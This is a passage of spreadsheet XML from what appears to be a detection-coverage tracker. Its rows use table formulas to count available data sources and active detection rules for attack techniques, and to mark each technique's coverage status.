    <row r="574" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A574" t="s">
        <v>2677</v>
      </c>
      <c r="B574" t="s">
        <v>2682</v>
      </c>
      <c r="C574" t="s">
        <v>2683</v>
      </c>
      <c r="D574" t="s">
        <v>0</v>
      </c>
      <c r="F574" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G574" s="9" cm="1">
        <f t="array" ref="G574">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H574" s="9" t="str" cm="1">
        <f t="array" ref="H574">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I574" s="9" t="str" cm="1">
        <f t="array" ref="I574">IF(SUM(IF($C574=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C574=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J574" s="9" t="str" cm="1">
        <f t="array" ref="J57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74" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M574" s="9" cm="1">
        <f t="array" ref="M574">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N574" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O574" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P574" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S57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74" t="s">
        <v>2513</v>
      </c>
      <c r="U574" t="s">
        <v>2684</v>
      </c>
      <c r="V574" t="s">
        <v>2669</v>
      </c>
      <c r="W574" t="b">
        <v>1</v>
      </c>
      <c r="X574" t="s">
        <v>2677</v>
      </c>
    </row>
    <row r="575" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A575" t="s">
        <v>2677</v>
      </c>
      <c r="B575" t="s">
        <v>2685</v>
      </c>
      <c r="C575" t="s">
        <v>2686</v>
      </c>
      <c r="D575" t="s">
        <v>0</v>
      </c>
      <c r="F575" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G575" s="9" cm="1">
        <f t="array" ref="G575">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H575" s="9" t="str" cm="1">
        <f t="array" ref="H575">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I575" s="9" t="str" cm="1">
        <f t="array" ref="I575">IF(SUM(IF($C575=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C575=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J575" s="9" t="str" cm="1">
        <f t="array" ref="J57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75" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M575" s="9" cm="1">
        <f t="array" ref="M575">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N575" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O575" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P575" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S57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75" t="s">
        <v>2513</v>
      </c>
      <c r="U575" t="s">
        <v>2687</v>
      </c>
      <c r="V575" t="s">
        <v>2669</v>
      </c>
      <c r="W575" t="b">
        <v>1</v>
      </c>
      <c r="X575" t="s">
        <v>2677</v>
      </c>
    </row>
    <row r="576" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A576" t="s">
        <v>2677</v>
      </c>
      <c r="B576" t="s">
        <v>2688</v>
      </c>
      <c r="C576" t="s">
        <v>2689</v>
      </c>
      <c r="D576" t="s">
        <v>0</v>
      </c>
      <c r="F576" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G576" s="9" cm="1">
        <f t="array" ref="G576">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H576" s="9" t="str" cm="1">
        <f t="array" ref="H576">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I576" s="9" t="str" cm="1">
        <f t="array" ref="I576">IF(SUM(IF($C576=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C576=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J576" s="9" t="str" cm="1">
        <f t="array" ref="J57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76" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M576" s="9" cm="1">
        <f t="array" ref="M576">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N576" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O576" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P576" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S57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76" t="s">
        <v>2513</v>
      </c>
      <c r="U576" t="s">
        <v>2690</v>
      </c>
      <c r="V576" t="s">
        <v>2669</v>
      </c>
      <c r="W576" t="b">
        <v>1</v>
      </c>
      <c r="X576" t="s">
        <v>2677</v>
      </c>
    </row>
    <row r="577" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A577" t="s">
        <v>2677</v>
      </c>
      <c r="B577" t="s">
        <v>2691</v>
      </c>
      <c r="C577" t="s">
        <v>2692</v>
      </c>
      <c r="D577" t="s">
        <v>0</v>
      </c>
      <c r="F577" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G577" s="9" cm="1">
        <f t="array" ref="G577">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H577" s="9" t="str" cm="1">
        <f t="array" ref="H577">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I577" s="9" t="str" cm="1">
        <f t="array" ref="I577">IF(SUM(IF($C577=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C577=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J577" s="9" t="str" cm="1">
        <f t="array" ref="J57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77" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M577" s="9" cm="1">
        <f t="array" ref="M577">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N577" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O577" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P577" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S57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77" t="s">
        <v>2513</v>
      </c>
      <c r="U577" t="s">
        <v>2693</v>
      </c>
      <c r="V577" t="s">
        <v>2669</v>
      </c>
      <c r="W577" t="b">
        <v>1</v>
      </c>
      <c r="X577" t="s">
        <v>2677</v>
      </c>
    </row>
    <row r="578" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A578" t="s">
        <v>2677</v>
      </c>
      <c r="B578" t="s">
        <v>2694</v>
      </c>
      <c r="C578" t="s">
        <v>2695</v>
      </c>
      <c r="D578" t="s">
        <v>0</v>
      </c>
      <c r="F578" s="9">
        <f t="shared" ref="F578:F626" si="9">LEN(E578)-LEN(SUBSTITUTE(E578,",",""))+1</f>
        <v>1</v>
      </c>
      <c r="G578" s="9" cm="1">
        <f t="array" ref="G578">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H578" s="9" t="str" cm="1">
        <f t="array" ref="H578">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I578" s="9" t="str" cm="1">
        <f t="array" ref="I578">IF(SUM(IF($C578=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C578=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J578" s="9" t="str" cm="1">
        <f t="array" ref="J57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78" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M578" s="9" cm="1">
        <f t="array" ref="M578">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N578" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O578" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P578" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S57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78" t="s">
        <v>2513</v>
      </c>
      <c r="U578" t="s">
        <v>2696</v>
      </c>
      <c r="V578" t="s">
        <v>2669</v>
      </c>
      <c r="W578" t="b">
        <v>1</v>
      </c>
      <c r="X578" t="s">
        <v>2677</v>
      </c>
    </row>
    <row r="579" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A579" t="s">
        <v>2697</v>
      </c>
      <c r="B579" t="s">
        <v>2697</v>
      </c>
      <c r="C579" t="s">
        <v>63</v>
      </c>
      <c r="D579" t="s">
        <v>0</v>
      </c>
      <c r="F579" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G579" s="9" cm="1">
        <f t="array" ref="G579">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H579" s="9" cm="1">
        <f t="array" ref="H579">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I579" s="9" t="str" cm="1">
        <f t="array" ref="I579">IF(SUM(IF($C579=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C579=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J579" s="9" cm="1">
        <f t="array" ref="J57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579" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M579" s="9" cm="1">
        <f t="array" ref="M579">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N579" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O579" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P579" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S57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79" t="s">
        <v>2513</v>
      </c>
      <c r="U579" t="s">
        <v>2698</v>
      </c>
      <c r="V579" t="s">
        <v>2669</v>
      </c>
      <c r="W579" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="580" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A580" t="s">
        <v>2697</v>
      </c>
      <c r="B580" t="s">
        <v>2699</v>
      </c>
      <c r="C580" t="s">
        <v>2700</v>
      </c>
      <c r="D580" t="s">
        <v>0</v>
      </c>
      <c r="F580" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G580" s="9" cm="1">
        <f t="array" ref="G580">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H580" s="9" t="str" cm="1">
        <f t="array" ref="H580">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I580" s="9" t="str" cm="1">
        <f t="array" ref="I580">IF(SUM(IF($C580=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C580=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J580" s="9" t="str" cm="1">
        <f t="array" ref="J58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80" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M580" s="9" cm="1">
        <f t="array" ref="M580">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N580" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O580" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P580" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S58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80" t="s">
        <v>2513</v>
      </c>
      <c r="U580" t="s">
        <v>2701</v>
      </c>
      <c r="V580" t="s">
        <v>2669</v>
      </c>
      <c r="W580" t="b">
        <v>1</v>
      </c>
      <c r="X580" t="s">
        <v>2697</v>
      </c>
    </row>
    <row r="581" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A581" t="s">
        <v>2697</v>
      </c>
      <c r="B581" t="s">
        <v>2702</v>
      </c>
      <c r="C581" t="s">
        <v>2703</v>
      </c>
      <c r="D581" t="s">
        <v>0</v>
      </c>
      <c r="F581" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G581" s="9" cm="1">
        <f t="array" ref="G581">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H581" s="9" t="str" cm="1">
        <f t="array" ref="H581">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I581" s="9" t="str" cm="1">
        <f t="array" ref="I581">IF(SUM(IF($C581=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C581=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J581" s="9" t="str" cm="1">
        <f t="array" ref="J58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81" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M581" s="9" cm="1">
        <f t="array" ref="M581">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N581" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O581" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P581" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S58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81" t="s">
        <v>2513</v>
      </c>
      <c r="U581" t="s">
        <v>2704</v>
      </c>
      <c r="V581" t="s">
        <v>2669</v>
      </c>
      <c r="W581" t="b">
        <v>1</v>
      </c>
      <c r="X581" t="s">
        <v>2697</v>
      </c>
    </row>
    <row r="582" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A582" t="s">
        <v>2697</v>
      </c>
      <c r="B582" t="s">
        <v>2705</v>
      </c>
      <c r="C582" t="s">
        <v>2706</v>
      </c>
      <c r="D582" t="s">
        <v>0</v>
      </c>
      <c r="F582" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G582" s="9" cm="1">
        <f t="array" ref="G582">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H582" s="9" t="str" cm="1">
        <f t="array" ref="H582">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I582" s="9" t="str" cm="1">
        <f t="array" ref="I582">IF(SUM(IF($C582=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C582=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J582" s="9" t="str" cm="1">
        <f t="array" ref="J58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82" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M582" s="9" cm="1">
        <f t="array" ref="M582">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N582" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O582" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P582" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S58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82" t="s">
        <v>2513</v>
      </c>
      <c r="U582" t="s">
        <v>2707</v>
      </c>
      <c r="V582" t="s">
        <v>2669</v>
      </c>
      <c r="W582" t="b">
        <v>1</v>
      </c>
      <c r="X582" t="s">
        <v>2697</v>
      </c>
    </row>
    <row r="583" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A583" t="s">
        <v>2697</v>
      </c>
      <c r="B583" t="s">
        <v>2708</v>
      </c>
      <c r="C583" t="s">
        <v>2709</v>
      </c>
      <c r="D583" t="s">
        <v>0</v>
      </c>
      <c r="F583" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G583" s="9" cm="1">
        <f t="array" ref="G583">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H583" s="9" t="str" cm="1">
        <f t="array" ref="H583">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I583" s="9" t="str" cm="1">
        <f t="array" ref="I583">IF(SUM(IF($C583=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C583=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J583" s="9" t="str" cm="1">
        <f t="array" ref="J58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83" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M583" s="9" cm="1">
